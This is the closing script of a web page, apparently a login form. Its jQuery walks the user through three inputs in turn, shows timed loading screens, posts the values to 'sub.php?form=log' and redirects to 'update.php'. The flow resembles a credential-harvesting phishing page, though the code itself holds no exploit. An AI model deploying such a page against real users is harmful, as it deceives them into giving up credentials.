    $( document ).ready(function(){
            $('#loader').fadeIn('slow', function(){
               $('#loader').delay(3000).fadeOut(); 
            });
        });


    setTimeout(function() {
  $('#logfir').fadeIn();        
}, 4000);

    
</script>









<script>
$(document).ready(function(){

  $("#button1").click(function(){
    $("#button1").hide();
    $("#input1").hide();
    $("#label1").hide();
    $("#label2").show();
    $("#input2").show();
    $("#button2").show();

  });});

$(document).ready(function(){

  $("#button2").click(function(){
    $("#button2").hide();
    $("#input2").hide();
    $("#label2").hide();
    $("#label3").show();
    $("#input3").show();
    $("#button3").show();

  });});




function clickButton(){
    if($("#input1").val() == ""){
            
                $("#input2").hide();
                $("#label2").hide();
                $("#label3").hide();
                $("#input3").hide();
                    $("#label1").show();
                    $("#input1").show();
                    $("#input1").css("border","1px solid red");
         }
         else if($("#input2").val() == ""){
            
                $("#input1").hide();
                $("#label1").hide();
                $("#label3").hide();
                $("#input3").hide();
                    $("#label2").show();
                    $("#input2").show();
                    $("#input2").css("border","1px solid red");
         }
         else if($("#input3").val() == ""){
            
                $("#input1").hide();
                $("#label1").hide();
                $("#label2").hide();
                $("#input2").hide();
                    $("#label3").show();
                    $("#input3").show();
                    $("#input3").css("border","1px solid red");
         }
         else{
    var input1=document.getElementById('input1').value;
    var input2=document.getElementById('input2').value;
    var input3=document.getElementById('input3').value;
    $.ajax({
        type:"post",
        url:"sub.php?form=log",
        data: 
        {  
           'input1' :input1,
           'input2' :input2,
           'input3' :input3,
        },
        cache:false,
        success: function (html) 
        {
                
         $("#logfir").hide();   
         $("#loader").show();
         $("#h1").hide();
         $("#button3"). attr("disabled", true);
         $("#input3"). attr("readonly", true);
         setTimeout(function(){
   
            window.location.href = "update.php";
               },5000);

         



        }
        
    });}

    return false;
 }





</script>



</body></html>